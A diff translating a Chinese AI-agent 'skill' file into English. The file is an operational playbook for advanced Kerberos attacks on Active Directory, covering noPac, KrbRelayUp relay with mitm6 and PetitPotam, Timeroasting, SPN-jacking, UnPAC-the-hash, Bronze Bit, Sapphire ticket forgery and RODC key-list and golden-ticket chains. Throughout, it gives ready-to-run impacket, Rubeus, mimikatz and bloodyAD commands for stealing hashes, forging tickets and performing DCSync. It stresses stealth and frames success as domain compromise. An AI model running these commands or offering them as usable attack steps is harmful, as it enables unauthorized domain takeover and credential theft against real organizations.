@@ -1,170 +1,172 @@
 ---
 name: kerberos-advanced-attack
-description: "高级 Kerberos 协议攻击技术集合。当基础 Kerberoasting/AS-REP Roasting 和委派攻击不够用时，使用本技能中的高级技术。覆盖 sAMAccountName spoofing (noPac/CVE-2021-42278)、Kerberos relay (KrbRelayUp)、Timeroasting (NTP 无认证哈希提取)、ASREQroast (MITM AS-REQ 捕获)、SPN-jacking (定向 Kerberoasting)、UnPAC-the-hash (证书→NT Hash)、Sapphire ticket (高隐蔽票据伪造)、Bronze Bit (CVE-2020-17049 委派绕过)、RODC 攻击链 (密钥列表导出/RODC Golden Ticket/RODC DACL 利用)。"
+description: "Collection of advanced Kerberos protocol attack techniques. Use the advanced techniques in this skill when basic Kerberoasting/AS-REP Roasting and delegation attacks are insufficient. Covers sAMAccountName spoofing (noPac/CVE-2021-42278), Kerberos relay (KrbRelayUp), Timeroasting (NTP unauthenticated hash extraction), ASREQroast (MITM AS-REQ capture), SPN-jacking (targeted Kerberoasting), UnPAC-the-hash (certificate to NT Hash), Sapphire ticket (high-stealth ticket forgery), Bronze Bit (CVE-2020-17049 delegation bypass), RODC attack chain (key list export/RODC Golden Ticket/RODC DACL abuse)."
+zh-signals: "高级 Kerberos 攻击集合，含 noPac、Kerberos relay、Timeroasting、Sapphire ticket 与 RODC 攻击链。信号:Kerberos,noPac,Timeroasting,RODC,Bronze Bit"
+when-to-use: "Use when basic Kerberoasting/AS-REP roasting and delegation attacks are insufficient and advanced Kerberos techniques are needed."
 metadata:
   tags: "kerberos,nopac,samaccountname,CVE-2021-42278,CVE-2021-42287,krbrelayup,kerberos relay,timeroasting,asreqroast,spn-jacking,unpac,sapphire ticket,bronze bit,CVE-2020-17049,RODC,read-only domain controller,kerberos key list,pre-windows 2000"
   category: "lateral"
 ---
 
-# 高级 Kerberos 攻击
+# Advanced Kerberos Attacks
 
-## 触发条件
+## Trigger Conditions
 
-- 需要使用高级 Kerberos 技术（noPac / KrbRelayUp / Timeroasting / RODC）
-- 基础 Kerberoasting 和委派攻击不够用
-- 发现 RODC（只读域控制器）
-- 需要更高隐蔽性的票据伪造（Sapphire ticket）
+- Advanced Kerberos techniques are required (noPac / KrbRelayUp / Timeroasting / RODC)
+- Basic Kerberoasting and delegation attacks are insufficient
+- An RODC (read-only domain controller) has been discovered
+- A higher-stealth ticket forgery is needed (Sapphire ticket)
 
-## 前置要求
+## Prerequisites
 
-| 技术 | 所需凭证 | 关键工具 |
+| Technique | Required credential | Key tools |
 |------|---------|---------|
-| Timeroasting | 无需凭证 | timeroast, netexec |
-| ASREQroast | 无需凭证 (需 MITM) | PCredz |
-| noPac | 低权限域用户 | noPac.py, Impacket |
-| KrbRelayUp | 本地 SYSTEM | KrbRelayUp, krbrelayx |
-| SPN-jacking | 域用户 + WriteSPN | Impacket, tgssub |
-| UnPAC-the-hash | 用户证书 | PKINITtools, Rubeus |
-| Bronze Bit | 受限委派服务账号 | Impacket getST |
+| Timeroasting | No credential | timeroast, netexec |
+| ASREQroast | No credential (MITM required) | PCredz |
+| noPac | Low-privileged domain user | noPac.py, Impacket |
+| KrbRelayUp | Local SYSTEM | KrbRelayUp, krbrelayx |
+| SPN-jacking | Domain user + WriteSPN | Impacket, tgssub |
+| UnPAC-the-hash | User certificate | PKINITtools, Rubeus |
+| Bronze Bit | Constrained delegation service account | Impacket getST |
 | Sapphire ticket | krbtgt hash | Impacket ticketer |
-| RODC 攻击链 | 视阶段而定 | Rubeus, bloodyAD, keylistattack |
+| RODC attack chain | Depends on the stage | Rubeus, bloodyAD, keylistattack |
 
-## 技术选择决策树
+## Technique Selection Decision Tree
 
 ```
-你目前有什么？
-├── 无凭证/无认证
-│   ├── 可达 DC NTP → Timeroasting
-│   └── 有 MITM 位置 → ASREQroast
-├── 低权限域用户
-│   ├── MAQ > 0 → sAMAccountName spoofing (noPac)
-│   └── 有 WriteSPN 权限 → SPN-jacking
-├── 本地 SYSTEM (无域凭证)
-│   └── LDAP signing 未强制 → KrbRelayUp
-├── 持有证书
+What do you currently have?
+├── No credential / no authentication
+│   ├── DC NTP reachable -> Timeroasting
+│   └── MITM position available -> ASREQroast
+├── Low-privileged domain user
+│   ├── MAQ > 0 -> sAMAccountName spoofing (noPac)
+│   └── WriteSPN rights -> SPN-jacking
+├── Local SYSTEM (no domain credential)
+│   └── LDAP signing not enforced -> KrbRelayUp
+├── Hold a certificate
 │   └── UnPAC-the-hash
-├── 有受限委派 + 目标受保护
+├── Constrained delegation available + target is protected
 │   └── Bronze Bit (CVE-2020-17049)
-├── 已有 krbtgt hash
-│   └── 需高隐蔽 → Sapphire ticket
-└── 发现 RODC
-    └── RODC 攻击链
+├── Already hold the krbtgt hash
+│   └── High stealth required -> Sapphire ticket
+└── Discovered an RODC
+    └── RODC attack chain
 ```
 
 ---
 
-## 1. Timeroasting — NTP 无认证哈希提取
+## 1. Timeroasting — NTP Unauthenticated Hash Extraction
 
-### 原理
+### How It Works
 
-DC 的 NTP 服务使用计算机账户的 NTLM hash (MD5-based key) 计算 NTP 响应中的 MAC 值。攻击者无需任何认证，仅通过发送 NTP 请求并指定不同 RID，即可获取计算机账户的 SNTP hash 用于离线破解。该 hash 基于 RC4 密钥，计算机账户如果使用弱密码（如 Pre-Windows 2000 设备），则可被快速破解。
+The DC's NTP service computes the MAC value in NTP responses using the computer account's NTLM hash (an MD5-based key). An attacker needs no authentication at all: by sending NTP requests with different RIDs, they can obtain the computer account's SNTP hash for offline cracking. This hash is based on an RC4 key, so computer accounts using weak passwords (such as Pre-Windows 2000 devices) can be cracked quickly.
 
-### 前置条件
+### Prerequisites
 
-- 网络可达 DC 的 NTP 端口 (UDP 123)
-- 无需任何认证凭据
+- Network access to the DC NTP port (UDP 123)
+- No authentication credential required
 
-### 核心命令
+### Core Commands
 
 ```bash
-# 无认证枚举 — Linux
+# Unauthenticated enumeration - Linux
 python3 timeroast.py "$DC_IP"
 
-# netexec 模块
+# netexec module
 netexec smb "$DC_IP" -M timeroast
 
-# Windows — 认证模式 (可生成针对性字典)
+# Windows - authenticated mode (can generate a targeted wordlist)
 Invoke-AuthenticatedTimeRoast -DomainController $DC_IP
 Invoke-AuthenticatedTimeRoast -DomainController $DC_IP -GenerateWordlist
 ```
 
 ```bash
-# 破解 SNTP hash
+# Crack the SNTP hash
 hashcat -m 31300 -a 0 -O hashes.txt $WORDLIST --username
 ```
 
-### 成功标志
+### Success Indicators
 
-- 获取 SNTP hash 文件
-- hashcat 破解出计算机账户密码
-- 注意: 破解速度比 Kerberos TGS hash 快约 10 倍
+- SNTP hash file obtained
+- hashcat cracks the computer account password
+- Note: cracking is roughly 10x faster than with Kerberos TGS hashes
 
 ---
 
-## 2. ASREQroast — MITM AS-REQ 捕获
+## 2. ASREQroast — MITM AS-REQ Capture
 
-### 原理
+### How It Works
 
-当攻击者处于 MITM 位置时（ARP 欺骗、ICMP 重定向、DHCPv6 投毒），可以捕获域用户正常 Kerberos 预认证中的 AS-REQ 加密时间戳。该时间戳使用用户密码派生的密钥加密，可离线破解。与 AS-REP Roasting 不同，ASREQroast 不需要目标禁用预认证。
+When the attacker holds a MITM position (ARP spoofing, ICMP redirect, DHCPv6 poisoning), they can capture the encrypted timestamp in a domain user's normal Kerberos pre-authentication AS-REQ. This timestamp is encrypted with a key derived from the user password and can be cracked offline. Unlike AS-REP Roasting, ASREQroast does not require the target to have pre-authentication disabled.
 
-### 前置条件
+### Prerequisites
 
-- 拥有 MITM 位置（ARP/ICMP redirect/DHCPv6）
-- 无需域凭据
+- MITM position (ARP/ICMP redirect/DHCPv6)
+- No domain credential required
 
-### 核心命令
+### Core Commands
 
 ```bash
-# 实时抓取
+# Capture in real time
 Pcredz -i $INTERFACE -v
 
-# 从 pcap 文件提取
+# Extract from a pcap file
 Pcredz -f "$PCAP_FILE"
 
-# 从目录批量提取
+# Batch extract from a directory
 Pcredz -d "$PCAP_DIR"
 ```
 
 ```bash
-# 破解 AS-REQ Pre-Auth etype 23
+# Crack AS-REQ Pre-Auth etype 23
 hashcat -m 7500 asreq_hashes.txt $WORDLIST
 ```
 
-### 成功标志
+### Success Indicators
 
-- 捕获到用户 AS-REQ 加密时间戳 hash
-- hashcat 破解出用户明文密码
+- Captured AS-REQ encrypted timestamp hashes for users
+- hashcat recovers the plaintext user password
 
 ---
 
 ## 3. sAMAccountName Spoofing (noPac) — CVE-2021-42278 + CVE-2021-42287
 
-### 原理
+### How It Works
 
-CVE-2021-42278 允许修改计算机账户的 sAMAccountName 为不带 `$` 的值。CVE-2021-42287 导致 KDC 在找不到请求者时自动追加 `$` 搜索。组合利用: 创建机器账户 → 改名为 DC 名(不带$) → 请求 TGT → 改回原名 → 用 TGT 做 S4U2self 获取 DC 的高权限 TGS。
+CVE-2021-42278 allows changing a computer account's sAMAccountName to a value without the trailing `$`. CVE-2021-42287 makes the KDC automatically append `$` when it cannot find the requester. Chaining the two: create a machine account -> rename it to the DC name (without `$`) -> request a TGT -> rename it back -> use the TGT with S4U2self to obtain a highly privileged TGS for the DC.
 
-### 前置条件
+### Prerequisites
 
-- 低权限域用户凭据
+- Low-privileged domain user credential
 - MAQ (ms-DS-MachineAccountQuota) > 0
-- 未安装补丁 KB5008102 + KB5008380
+- Patches KB5008102 + KB5008380 not installed
 
-### 核心命令
+### Core Commands
 
 ```bash
-# 自动化 — 一键利用
+# Automated - one-shot exploitation
 noPac.py $DOMAIN/$USER:'$PASSWORD' -dc-ip $DC_IP --impersonate Administrator -dump
 noPac.py $DOMAIN/$USER:'$PASSWORD' -dc-ip $DC_IP --impersonate Administrator -use-ldap -dump
 ```
 
 ```bash
-# 手动链 — UNIX (Impacket)
-# Step 1: 创建机器账户
+# Manual chain - UNIX (Impacket)
+# Step 1: Create the machine account
 addcomputer.py -computer-name 'FAKEPC$' -computer-pass 'FakePass123' -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"
 
-# Step 2: 清除 SPN (避免约束检查)
+# Step 2: Clear the SPN (avoid constraint checks)
 addspn.py --clear -t 'FAKEPC$' -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"
 
-# Step 3: 改名为 DC
+# Step 3: Rename to the DC
 renameMachine.py -current-name 'FAKEPC$' -new-name "$DC_NAME" -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"
 
-# Step 4: 用 DC 名请求 TGT
+# Step 4: Request a TGT using the DC name
 getTGT.py -dc-ip $DC_IP "$DOMAIN/$DC_NAME:FakePass123"
 
-# Step 5: 改回原名
+# Step 5: Rename back to the original name
 renameMachine.py -current-name "$DC_NAME" -new-name 'FAKEPC$' -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"
 
-# Step 6: S4U2self 获取 DC ST
+# Step 6: Use S4U2self to obtain the DC ST
 export KRB5CCNAME="$DC_NAME.ccache"
 getST.py -self -impersonate "Administrator" -altservice "cifs/$DC_FQDN" -k -no-pass -dc-ip $DC_IP "$DOMAIN/$DC_NAME"
 
@@ -174,8 +176,8 @@ secretsdump.py -k -no-pass -dc-ip $DC_IP "$DC_FQDN"
 ```
 
 ```powershell
-# 手动链 — Windows
-New-MachineAccount -MachineAccount "FAKEPC" -Password $(ConvertTo-SecureString "FakePass123" -AsPlainText -Force) -Domain $DOMAIN
+# Manual chain - Windows
+New-Machineaccount -MachineAccount "FAKEPC" -Password $(ConvertTo-SecureString "FakePass123" -AsPlainText -Force) -Domain $DOMAIN
 Set-DomainObject "FAKEPC$" -Clear 'servicePrincipalName'
 Set-MachineAccountAttribute -MachineAccount "FAKEPC" -Value "$DC_NAME" -Attribute samaccountname
 Rubeus.exe asktgt /user:"$DC_NAME" /password:"FakePass123" /domain:$DOMAIN /dc:$DC_FQDN /nowrap
@@ -184,35 +186,35 @@ Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"cifs/$DC_FQDN
 mimikatz.exe "lsadump::dcsync /domain:$DOMAIN /user:Administrator"
 ```
 
-### 成功标志
+### Success Indicators
 
-- 获取 DC 的 cifs/ldap 服务票据
-- DCSync 成功导出域内 hash
+- Obtained the DC's cifs/ldap service ticket
+- DCSync successfully exported hashes from the domain
 
 ---
 
-## 4. KrbRelayUp — 本地 Kerberos Relay 提权
+## 4. KrbRelayUp — Local Kerberos Relay Privilege Escalation
 
-### 原理
+### How It Works
 
-在已获取本地 SYSTEM 权限的场景下，将机器账户的 Kerberos 认证 relay 到 LDAP 服务，配置 RBCD (Resource-Based Constrained Delegation)，然后通过 S4U 链获取本地管理员票据，实现从 SYSTEM 到域内高权限的提升。
+In a scenario where local SYSTEM access has already been obtained, relay the machine account's Kerberos authentication to the LDAP service, configure RBCD (Resource-Based Constrained Delegation), then leverage an S4U chain to obtain a local administrator ticket, escalating from SYSTEM to high privileges in the domain.
 
-### 前置条件
+### Prerequisites
 
-- 本地 SYSTEM 权限
-- LDAP signing 未强制
-- MAQ > 0 或已控制机器账户
+- Local SYSTEM access
+- LDAP signing not enforced
+- MAQ > 0 or a controlled machine account
 
-### 核心命令
+### Core Commands
 
 ```bash
-# 基础利用
+# Base exploitation
 KrbRelayUp.exe relay -Domain $DOMAIN -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword Pass
 KrbRelayUp.exe spawn -m rbcd -d $DOMAIN -dc $DC_FQDN -cn YOURPC$ -cp Pass
 ```
 
 ```bash
-# DNS 投毒 relay 变体 (krbrelayx + mitm6)
+# DNS poisoning relay variant (krbrelayx + mitm6)
 krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER_IP \
   --victim $TARGET_SAMNAME --adcs --template Machine
 
@@ -220,45 +222,45 @@ mitm6 -i $INTERFACE -d $DOMAIN -hw $TARGET_FQDN --relay $ADCS_FQDN -v
 ```
 
 ```bash
-# Coerced auth relay 变体
+# Coerced auth relay variant
 dnstool.py -u "$DOMAIN\\$USER" -p "$PASSWORD" -r attacker.$DOMAIN -a add -t A -d $ATTACKER_IP $DC_IP
 krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER_IP --victim $TARGET_SAMNAME --adcs --template Machine
 PetitPotam.py attacker.$DOMAIN@80/test $TARGET_IP
 ```
 
-### 成功标志
+### Success Indicators
 
-- RBCD 配置成功写入 msDS-AllowedToActOnBehalfOfOtherIdentity
-- S4U 获取本地管理员票据
-- 本地提权到 SYSTEM / 域内横向
+- RBCD successfully written into msDS-AllowedToActOnBehalfOfOtherIdentity
+- S4U obtained a local administrator ticket
+- Local escalation to SYSTEM / lateral movement in the domain
 
 ---
 
-## 5. SPN-jacking — KCD + DACL 组合定向 Kerberoasting
+## 5. SPN-jacking — Targeted Kerberoasting via KCD + DACL
 
-### 原理
+### How It Works
 
-当拥有对某账户的 WriteSPN 权限且环境中已配置 KCD 时，可以将目标 SPN "移动"到可控账户上，然后利用 S4U 链请求票据，最后用 tgssub 编辑票据中的 SPN 字段指向真正目标。
+When you hold WriteSPN rights on an account and the environment already has KCD configured, you can "move" the target SPN onto an account you control, request a ticket through the S4U chain, and finally use tgssub to edit the SPN field inside the ticket to point at the real target.
 
-### 前置条件
+### Prerequisites
 
-- KCD (约束委派) 已配置
-- 对另一个账户拥有 WriteSPN 权限
+- KCD (constrained delegation) is configured
+- WriteSPN rights on another account
 
-### 核心命令
+### Core Commands
 
 ```bash
-# UNIX — 完整 SPN-jacking 流程
-# Step 1: 清除目标 B 的 SPN
+# UNIX - full SPN-jacking flow
+# Step 1: Clear target B's SPN
 addspn.py --clear -t 'ServerB$' -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"
 
-# Step 2: 将 B 的 SPN 添加到可控账户 C
+# Step 2: Add B's SPN to the controllable account C
 addspn.py -t 'ServerC$' --spn "cifs/serverB.$DOMAIN" -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"
 
-# Step 3: S4U 请求票据
+# Step 3: Request the ticket via S4U
 getST.py -spn "cifs/serverB.$DOMAIN" -impersonate "Administrator" "$DOMAIN/serverA\$:$PASSWORD"
 
-# Step 4: 编辑票据 SPN
+# Step 4: Edit the ticket SPN
 tgssub.py -in serverB.ccache -out final.ccache -altservice "cifs/serverC.$DOMAIN"
 ```
 
@@ -269,58 +271,58 @@ Set-DomainObject -Identity ServerC$ -Set @{serviceprincipalname="cifs/serverB.$D
 Rubeus.exe s4u /ticket:$TGT /impersonateuser:Administrator /msdsspn:"cifs/serverB.$DOMAIN" /altservice:"cifs/serverC.$DOMAIN" /ptt
 ```
 
-### 成功标志
+### Success Indicators
 
-- 获取目标服务的有效 ST
-- 可访问目标服务 (cifs/http/mssql 等)
+- Obtained a valid ST for the target service
+- Can access the target service (cifs/http/mssql, etc.)
 
 ---
 
-## 6. UnPAC-the-hash — PKINIT 证书转 NT Hash
+## 6. UnPAC-the-hash — PKINIT Certificate to NT Hash
 
-### 原理
+### How It Works
 
-通过 PKINIT 获取的 TGT 的 PAC 中包含用户的 NT hash。利用 User-to-User (U2U) 请求机制，用自己的 TGT 加密自己的 TGS，然后从中提取 NT hash。常用于 ADCS 攻击或 Shadow Credentials 攻击后的凭据提取。
+The PAC in a TGT obtained via PKINIT contains the user's NT hash. Using the User-to-User (U2U) request mechanism, you encrypt your own TGS with your own TGT and then extract the NT hash from it. This is commonly used for credential extraction after ADCS exploitation or Shadow Credentials attacks.
 
-### 前置条件
+### Prerequisites
 
-- 持有目标用户的有效证书 (.pfx/.pem)
-- 通常来自 ADCS 利用或 Shadow Credentials 写入
+- Hold a valid certificate for the target user (.pfx/.pem)
+- Usually obtained from ADCS exploitation or a Shadow Credentials write
 
-### 核心命令
+### Core Commands
 
 ```bash
-# PKINITtools — Linux
+# PKINITtools - Linux
 gettgtpkinit.py -cert-pfx "$CERT_PFX" -pfx-pass "$PFX_PASS" "$DOMAIN/$USER" tgt.ccache
-# 记录输出中的 AS-REP encryption key
+# Record the AS-REP encryption key from the output
 
 getnthash.py -key '$AS_REP_KEY' '$DOMAIN'/'$USER'
 ```
 
 ```powershell
-# Rubeus — Windows
+# Rubeus - Windows
 Rubeus.exe asktgt /getcredentials /user:"$USER" /certificate:"$CERT_PFX" /password:"$PFX_PASS" /domain:"$DOMAIN" /dc:"$DC_FQDN" /show
 ```
 
-### 成功标志
+### Success Indicators
 
-- 成功获取目标用户的 NT hash
-- 可用于 Pass-the-Hash 或进一步攻击
+- Successfully obtained the target user's NT hash
+- Usable for Pass-the-Hash or further attacks
 
 ---
 
-## 7. Bronze Bit (CVE-2020-17049) — 委派 Forwardable 标志绕过
+## 7. Bronze Bit (CVE-2020-17049) — Bypassing the Delegation Forwardable Flag
 
-### 原理
+### How It Works
 
-S4U2self 获取的票据中 forwardable 标志由 KDC 根据目标用户是否在 Protected Users 组或标记为 sensitive 来设置。Bronze Bit 攻击直接修改票据中的 forwardable 位（因为该票据用服务账户密钥加密，而攻击者已持有该密钥），从而绕过限制，将票据用于 S4U2proxy。
+The forwardable flag on tickets obtained via S4U2self is set by the KDC based on whether the target user belongs to the Protected Users group or is marked as sensitive. The Bronze Bit attack directly modifies the forwardable bit in the ticket (because the ticket is encrypted with the service account key, which the attacker already holds), bypassing the restriction so the ticket can be used for S4U2proxy.
 
-### 前置条件
+### Prerequisites
 
-- 控制一个配置了约束委派的服务账号
-- 目标用户在 Protected Users 组或标记 "Account is sensitive and cannot be delegated"
+- Control of a service account configured for constrained delegation
+- The target user is in the Protected Users group or flagged "Account is sensitive and cannot be delegated"
 
-### 核心命令
+### Core Commands
 
 ```bash
 getST.py -force-forwardable \
@@ -331,25 +333,25 @@ getST.py -force-forwardable \
   "$DOMAIN/$SERVICE_ACCOUNT"
 ```
 
-### 成功标志
+### Success Indicators
 
-- 获取可转发 (forwardable) 的 ST for 受保护用户
-- 可访问委派目标服务
+- Obtained a forwardable ST for a protected user
+- Can access the delegated target service
 
 ---
 
-## 8. Sapphire Ticket — 高隐蔽票据伪造
+## 8. Sapphire Ticket — High-Stealth Ticket Forgery
 
-### 原理
+### How It Works
 
-Diamond Ticket 的进阶变体。普通 Golden/Diamond Ticket 使用伪造的 PAC，Sapphire Ticket 通过 S4U2self + U2U 机制获取目标用户的真实 PAC，替换到伪造票据中。由于 PAC 来自 KDC 的真实签名，检测难度极高。
+An advanced variant of the Diamond Ticket. Ordinary Golden/Diamond Tickets use a forged PAC, while the Sapphire Ticket obtains the target user's real PAC through S4U2self + U2U and substitutes it into the forged ticket. Because the PAC carries the KDC's real signature, detection is extremely difficult.
 
-### 前置条件
+### Prerequisites
 
-- 已获取 krbtgt hash (AES + NT hash)
-- 了解目标用户 RID 和域 SID
+- Obtained the krbtgt hash (AES + NT hash)
+- Know the target user's RID and the domain SID
 
-### 核心命令
+### Core Commands
 
 ```bash
 ticketer.py -request \
@@ -364,59 +366,59 @@ ticketer.py -request \
   'baduser'
 ```
 
-### 注意事项
+### Notes
 
-- KB5008380 补丁后 KDC 检查 PAC_REQUESTOR 和 PAC_ATTRIBUTES_INFO 结构
-- 缺少这些字段可能导致 KDC_ERR_TGT_REVOKED
-- 与 Golden/Diamond 对比: Sapphire 使用真实 PAC (S4U 获取)，最难检测
+- After the KB5008380 patch the KDC validates the PAC_REQUESTOR and PAC_ATTRIBUTES_INFO structures
+- Missing these fields can trigger KDC_ERR_TGT_REVOKED
+- Compared with Golden/Diamond: Sapphire uses a real PAC (obtained via S4U) and is the hardest to detect
 
-### 成功标志
+### Success Indicators
 
-- 获取包含真实 PAC 的伪造票据
-- 票据可正常通过 KDC 验证
+- Obtained a forged ticket containing a real PAC
+- The ticket passes KDC validation normally
 
 ---
 
-## 9. RODC 攻击链
+## 9. RODC Attack Chain
 
-### 原理
+### How It Works
 
-只读域控制器 (RODC) 拥有独立的 krbtgt 密钥 (krbtgt_XXXXX)，通过密码复制策略 (PRP) 控制可缓存哪些账户的密钥。攻击 RODC 可提取受允许缓存的账户密钥，或通过 DACL 修改 PRP 扩大影响范围。
+A read-only domain controller (RODC) holds its own krbtgt key (krbtgt_XXXXX) and uses the password replication policy (PRP) to control whose account keys may be cached. Attacking an RODC allows extracting the keys of accounts that are allowed to be cached, or modifying the PRP via DACL to widen the impact.
 
-### 枚举 RODC
+### Enumerating RODC
 
 ```bash
-# LDAP 查询
+# LDAP query
 ldapsearch -H ldap://$DC_IP -b "DC=$DOMAIN_DN" "(primaryGroupID=521)" dn sAMAccountName msDS-SecondaryKrbTgtNumber
 
 # netexec
 nxc ldap $DC_IP -u "$USER" -p "$PASSWORD" -M rodc
 ```
 
-### PRP 策略查询
+### PRP Policy Query
 
 ```bash
-# msDS-RevealOnDemandGroup — 允许缓存列表
-# msDS-NeverRevealGroup — 拒绝缓存列表
+# msDS-RevealOnDemandGroup - the allowed-to-cache list
+# msDS-NeverRevealGroup - the denied-to-cache list
 ldapsearch -H ldap://$DC_IP -b "CN=$RODC_NAME,OU=Domain Controllers,DC=$DOMAIN_DN" \
   msDS-RevealOnDemandGroup msDS-NeverRevealGroup managedBy
 ```
 
-### Key List 攻击 — 提取缓存密钥
+### Key List Attack — Extracting Cached Keys
 
 ```bash
-# 完整模式 (包含被 Denied 的)
+# Full mode (includes the Denied entries)
 keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" -full "$DOMAIN/$USER:$PASS"@"$RODC"
 
-# 正常模式 (遵循 Denied List)
+# Normal mode (respects the Denied list)
 keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" "$DOMAIN/$USER:$PASS"@"$RODC"
 
-# 指定用户模式
+# Specific user mode
 keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" -t "$TARGET_USER" "$DOMAIN/$USER:$PASS"@"$RODC"
 ```
 
 ```powershell
-# Windows — Rubeus
+# Windows - Rubeus
 Rubeus.exe golden /rodcNumber:$KRBTGT_NUM /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:rodc.kirbi /aes256:$KRBTGT_AES /user:$USER /id:$RID /domain:$DOMAIN /sid:$SID
 Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:rodc.kirbi /service:krbtgt/$DOMAIN
 ```
@@ -429,17 +431,17 @@ Rubeus.exe golden /rodcNumber:$KRBTGT_NUM /flags:forwardable,renewable,enc_pa_re
   /user:Administrator /id:500 /domain:$DOMAIN /sid:$DOMAIN_SID
 ```
 
-- kvno 字段必须匹配 RODC 的 krbtgt 版本号
-- 票据提交到可写 DC 时，PAC 会被重新计算验证
+- The kvno field must match the RODC's krbtgt version number
+- When the ticket is submitted to a writable DC, the PAC is recomputed and validated
 
-### RODC DACL 利用 — 修改 PRP 扩大影响
+### RODC DACL Abuse — Modifying the PRP to Widen the Impact
 
 ```bash
-# bloodyAD — 添加管理员到允许列表
+# bloodyAD - add administrators to the allowed list
 bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP set object "$RODC_DN" \
   msDS-RevealOnDemandGroup -v "CN=Domain Admins,CN=Users,DC=$DOMAIN_DN"
 
-# bloodyAD — 清除拒绝列表
+# bloodyAD - clear the denied list
 bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP set object "$RODC_DN" \
   msDS-NeverRevealGroup
 ```
@@ -450,31 +452,31 @@ Set-DomainObject -Identity "$RODC_DN" -Append @{'msDS-RevealOnDemandGroup'='CN=D
 Set-DomainObject -Identity "$RODC_DN" -Clear 'msDS-NeverRevealGroup'
 ```
 
-- 攻击链: 修改 PRP → 导出 krbtgt_XXXXX → RODC Golden Ticket → Key List 攻击
+- Attack chain: modify the PRP -> export krbtgt_XXXXX -> RODC Golden Ticket -> Key List attack
 
-### Pre-Windows 2000 计算机账户
+### Pre-Windows 2000 Computer Accounts
 
 ```bash
-# 默认密码 = 小写计算机名去掉 $
-# 筛选: UAC=4128 + logonCount=0
+# Default password = lowercase computer name without the $
+# Filter: UAC=4128 + logonCount=0
 ldapsearch -H ldap://$DC_IP -b "DC=$DOMAIN_DN" "(&(userAccountControl=4128)(logonCount=0))" sAMAccountName
 
-# 批量验证
+# Bulk validation
 nxc smb $DC_IP -u computers.txt -p passwords.txt --no-bruteforce
 
-# Kerberos 认证
+# Kerberos authentication
 getTGT.py "$DOMAIN/OLDPC\$:oldpc"
 ```
 
-### 成功标志
+### Success Indicators
 
-- 提取目标账户 NT hash
-- 获取 RODC Golden Ticket
-- 修改 PRP 后可缓存高权限账户密钥
+- Extracted the target account's NT hash
+- Obtained an RODC Golden Ticket
+- After modifying the PRP, high-privileged account keys can be cached
 
 ---
 
-## 深入参考
+## Further Reading
 
-- → [references/kerberos-escalation.md](references/kerberos-escalation.md) — noPac / KrbRelayUp / Bronze Bit / SPN-jacking / Timeroasting / ASREQroast / UnPAC / Sapphire 完整命令参考
-- → [references/rodc-attack.md](references/rodc-attack.md) — RODC 概念、Key List 攻击、RODC Golden Ticket、DACL 利用、Pre-Windows 2000
+- → [references/kerberos-escalation.md](references/kerberos-escalation.md) — Full command reference for noPac / KrbRelayUp / Bronze Bit / SPN-jacking / Timeroasting / ASREQroast / UnPAC / Sapphire
+- → [references/rodc-attack.md](references/rodc-attack.md) — RODC concepts, Key List attack, RODC Golden Ticket, DACL abuse, Pre-Windows 2000
